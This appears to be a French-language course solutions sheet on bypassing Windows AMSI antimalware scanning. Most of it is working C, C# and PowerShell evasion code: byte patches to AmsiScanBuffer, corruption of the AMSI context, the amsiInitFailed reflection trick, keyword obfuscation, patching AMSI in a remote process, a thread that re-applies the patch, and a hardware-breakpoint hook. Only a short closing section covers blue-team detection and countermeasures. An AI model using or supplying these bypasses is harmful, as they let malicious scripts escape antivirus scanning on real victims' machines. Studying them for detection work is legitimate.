SOLUTIONS - Module 42 : AMSI Bypass

AVERTISSEMENT : Solutions educatives uniquement. Jamais utiliser pour evasion AV malveillante.

Solution 1 : AMSI Function Enumerator

Enumeration complete API surface AMSI.

```c
typedef struct {
    char name[64];
    void* address;
    unsigned char first_bytes[16];
} AmsiFunction;

void enumerate_amsi_functions(void) {
    const char* amsi_funcs[] = {
        "AmsiInitialize",
        "AmsiUninitialize",
        "AmsiOpenSession",
        "AmsiCloseSession",
        "AmsiScanBuffer",
        "AmsiScanString",
        "AmsiNotifyOperation",
        "AmsiResultIsMalware"
    };

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    printf("Function                        Address      First Bytes\n");
    printf("----------------------------------------------------------------\n");

    for (int i = 0; i < sizeof(amsi_funcs) / sizeof(amsi_funcs[0]); i++) {
        void* addr = GetProcAddress(amsi, amsi_funcs[i]);
        if (!addr) continue;

        unsigned char* bytes = (unsigned char*)addr;
        printf("%-30s 0x%p   ", amsi_funcs[i], addr);

        for (int j = 0; j < 8; j++) {
            printf("%02X ", bytes[j]);
        }

        // Detecter patches communs
        if (bytes[0] == 0xC3) printf(" [RET PATCH]");
        else if (bytes[0] == 0xB8 && bytes[5] == 0xC3) printf(" [MOV/RET]");
        else if (bytes[0] == 0x31 && bytes[1] == 0xC0) printf(" [XOR/RET]");

        printf("\n");
    }
}
```

Solution 2 : Multiple Patch Techniques

Implementation 5 techniques patch differentes.

```c
// Technique 1: MOV EAX, 0; RET
int patch_mov_ret(void* addr) {
    unsigned char patch[] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3};
    return write_patch(addr, patch, sizeof(patch));
}

// Technique 2: XOR EAX, EAX; RET (plus court)
int patch_xor_ret(void* addr) {
    unsigned char patch[] = {0x31, 0xC0, 0xC3};
    return write_patch(addr, patch, sizeof(patch));
}

// Technique 3: SUB EAX, EAX; RET
int patch_sub_ret(void* addr) {
    unsigned char patch[] = {0x29, 0xC0, 0xC3};
    return write_patch(addr, patch, sizeof(patch));
}

// Technique 4: RET immediat (plus court possible)
int patch_ret_only(void* addr) {
    unsigned char patch[] = {0xC3};
    return write_patch(addr, patch, sizeof(patch));
}

// Technique 5: JMP vers stub distant
int patch_jmp_stub(void* addr) {
    // Calculer offset relatif vers stub
    void* stub = create_clean_stub();
    int32_t offset = (int32_t)((uintptr_t)stub - (uintptr_t)addr - 5);

    unsigned char patch[5] = {
        0xE9,  // JMP rel32
        offset & 0xFF,
        (offset >> 8) & 0xFF,
        (offset >> 16) & 0xFF,
        (offset >> 24) & 0xFF
    };

    return write_patch(addr, patch, sizeof(patch));
}

void* create_clean_stub(void) {
    // Stub: XOR EAX, EAX; RET
    void* stub = VirtualAlloc(NULL, 16, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    unsigned char code[] = {0x31, 0xC0, 0xC3};
    memcpy(stub, code, sizeof(code));
    return stub;
}
```

Solution 3 : Context Corruption Bypass

Corruption structure AMSI context interne.

```c
// Structure AMSI context (reverse-engineered)
typedef struct {
    DWORD signature;
    PVOID session;
    PVOID* callbacks;
    DWORD flags;
    // ... autres champs
} AMSI_CONTEXT_INTERNAL;

int corrupt_amsi_context(HAMSICONTEXT context) {
    printf("[*] Corrupting AMSI context...\n");

    // Cast vers structure interne
    AMSI_CONTEXT_INTERNAL* ctx = (AMSI_CONTEXT_INTERNAL*)context;

    // Modifier protection
    DWORD old_protect;
    if (!VirtualProtect(ctx, sizeof(AMSI_CONTEXT_INTERNAL),
                        PAGE_READWRITE, &old_protect)) {
        return -1;
    }

    // Corrompre signature (invalidation)
    ctx->signature = 0xDEADBEEF;

    // NULLifier callbacks
    if (ctx->callbacks) {
        ctx->callbacks = NULL;
    }

    // Forcer flags disabled
    ctx->flags = 0;

    VirtualProtect(ctx, sizeof(AMSI_CONTEXT_INTERNAL), old_protect, &old_protect);

    printf("[+] AMSI context corrupted\n");
    return 0;
}
```

Solution 4 : PowerShell Integration

Bypass AMSI via C# reflection appele depuis PowerShell.

```csharp
// Fichier amsbypass.cs
using System;
using System.Reflection;

public class AmsiBypass {
    public static void Disable() {
        var amsiUtils = typeof(PSObject).Assembly.GetType(
            "System.Management.Automation.AmsiUtils");

        var amsiInitFailed = amsiUtils.GetField("amsiInitFailed",
            BindingFlags.NonPublic | BindingFlags.Static);

        amsiInitFailed.SetValue(null, true);
    }
}

// Compilation
// csc /target:library /out:amsbypass.dll amsbypass.cs

// Usage PowerShell
[Reflection.Assembly]::LoadFile("C:\path\to\amsbypass.dll")
[AmsiBypass]::Disable()
```

Version C avec COM interop:

```c
#include <windows.h>
#import "mscorlib.tlb" raw_interfaces_only

void disable_amsi_via_clr(void) {
    ICLRMetaHost* metahost = NULL;
    ICLRRuntimeInfo* runtime = NULL;

    CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost,
                      (LPVOID*)&metahost);

    // Load .NET runtime
    metahost->GetRuntime(L"v4.0.30319", &IID_ICLRRuntimeInfo,
                         (LPVOID*)&runtime);

    // Execute C# code via ICLRRuntimeHost...
}
```

Solution 5 : AMSI Trigger Analyzer

Identification systematique triggers AMSI.

```c
void test_amsi_triggers(HAMSICONTEXT context) {
    const char* keywords[] = {
        "Invoke-Expression",
        "IEX",
        "DownloadString",
        "Net.WebClient",
        "Reflection.Assembly",
        "System.Management.Automation",
        "amsiInitFailed",
        "AmsiUtils",
        "amsiContext",
        "AMSI"
    };

    printf("Keyword                        Result\n");
    printf("------------------------------------------------\n");

    for (int i = 0; i < sizeof(keywords) / sizeof(keywords[0]); i++) {
        AMSI_RESULT result;
        AmsiScanBuffer(context, (PVOID)keywords[i], strlen(keywords[i]),
                      L"TriggerTest", NULL, &result);

        printf("%-30s ", keywords[i]);
        if (result >= AMSI_RESULT_DETECTED) {
            printf("DETECTED\n");
        } else {
            printf("Clean\n");
        }
    }
}

// Obfuscation pour eviter triggers
void obfuscate_string(const char* input, char* output) {
    // Technique 1: Fragmenter string
    // "AmsiScanBuffer" -> "Amsi" + "Scan" + "Buffer"

    // Technique 2: Base64 encode
    base64_encode(input, output);

    // Technique 3: XOR avec cle
    for (int i = 0; input[i]; i++) {
        output[i] = input[i] ^ 0xAA;
    }
}
```

Solution 6 : Remote Process AMSI Bypass

Patch AMSI dans PowerShell distant.

```c
int patch_remote_amsi(DWORD pid) {
    printf("[*] Targeting process PID: %lu\n", pid);

    HANDLE process = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                                  PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!process) {
        printf("[!] OpenProcess failed\n");
        return -1;
    }

    // Localiser amsi.dll dans process distant
    HMODULE amsi_local = GetModuleHandleA("amsi.dll");
    void* amsi_scan_buffer = GetProcAddress(amsi_local, "AmsiScanBuffer");

    // Meme base ASLR sur Windows 10+
    void* remote_addr = amsi_scan_buffer;

    printf("[+] Remote AmsiScanBuffer: 0x%p\n", remote_addr);

    // Modifier protection
    DWORD old_protect;
    if (!VirtualProtectEx(process, remote_addr, 6,
                          PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[!] VirtualProtectEx failed\n");
        CloseHandle(process);
        return -1;
    }

    // Patch: MOV EAX, 0; RET
    unsigned char patch[] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3};
    SIZE_T written;

    if (!WriteProcessMemory(process, remote_addr, patch, sizeof(patch), &written)) {
        printf("[!] WriteProcessMemory failed\n");
        CloseHandle(process);
        return -1;
    }

    printf("[+] AMSI patched in remote process\n");
    CloseHandle(process);
    return 0;
}
```

Solution 7 : Persistent AMSI Bypass

Monitoring continu + re-patching automatique.

```c
typedef struct {
    void* address;
    unsigned char expected_patch[16];
    size_t patch_size;
    volatile BOOL keep_running;
} PersistentPatch;

DWORD WINAPI monitor_amsi_integrity(LPVOID param) {
    PersistentPatch* pp = (PersistentPatch*)param;

    while (pp->keep_running) {
        Sleep(50);  // Check toutes les 50ms

        // Verifier si patch toujours present
        if (memcmp(pp->address, pp->expected_patch, pp->patch_size) != 0) {
            printf("[!] AMSI patch tampered - reapplying...\n");

            DWORD old_protect;
            VirtualProtect(pp->address, pp->patch_size,
                          PAGE_EXECUTE_READWRITE, &old_protect);

            memcpy(pp->address, pp->expected_patch, pp->patch_size);

            VirtualProtect(pp->address, pp->patch_size, old_protect, &old_protect);

            printf("[+] AMSI re-patched\n");
        }
    }

    return 0;
}

void enable_persistent_bypass(void) {
    PersistentPatch pp = {0};
    pp.address = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    pp.expected_patch[0] = 0xB8;  // MOV EAX, 0
    pp.expected_patch[5] = 0xC3;  // RET
    pp.patch_size = 6;
    pp.keep_running = TRUE;

    // Appliquer patch initial
    apply_patch(&pp);

    // Creer thread monitoring
    CreateThread(NULL, 0, monitor_amsi_integrity, &pp, 0, NULL);
}
```

Solution 8 : Hardware Breakpoint AMSI Hook

Hook via debug registers (stealth maximal).

```c
void set_amsi_hardware_breakpoint(void) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    GetThreadContext(GetCurrentThread(), &ctx);

    void* amsi_scan = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

    ctx.Dr0 = (ULONG_PTR)amsi_scan;
    ctx.Dr7 = 0x00000001;  // Local DR0 enable, execute breakpoint

    SetThreadContext(GetCurrentThread(), &ctx);

    // Installer exception handler
    AddVectoredExceptionHandler(1, amsi_exception_handler);

    printf("[+] Hardware breakpoint set on AmsiScanBuffer\n");
}

LONG CALLBACK amsi_exception_handler(EXCEPTION_POINTERS* ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        void* fault = ex->ExceptionRecord->ExceptionAddress;
        void* amsi_scan = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

        if (fault == amsi_scan) {
            // Forcer retour CLEAN
            ex->ContextRecord->Rax = 0;  // AMSI_RESULT_CLEAN

            // Skip fonction (retour caller)
            ex->ContextRecord->Rip = *(ULONG_PTR*)ex->ContextRecord->Rsp;
            ex->ContextRecord->Rsp += 8;

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
```

POINTS CLES

- AMSI bypass efficace contre scanning statique scripts
- Detection facile via memory scanning amsi.dll
- Hardware breakpoints plus stealth mais complexe
- Context corruption alternative interessante
- PowerShell reflection = technique classique

DETECTION PAR BLUE TEAM

1. Memory scanning periodique amsi.dll
2. Monitoring VirtualProtect sur pages amsi.dll
3. PowerShell script block logging (detect bypass code)
4. Event correlation (bypass + suspicious script exec)
5. Behavioral analysis (actions post-bypass)

CONTRE-MESURES

- Protected Process Light (PPL) pour PowerShell
- Multiple AV layers (pas seulement AMSI)
- Kernel-mode scanning (bypass AMSI userland)
- Script block logging + centralized SIEM
- Constrained Language Mode PowerShell
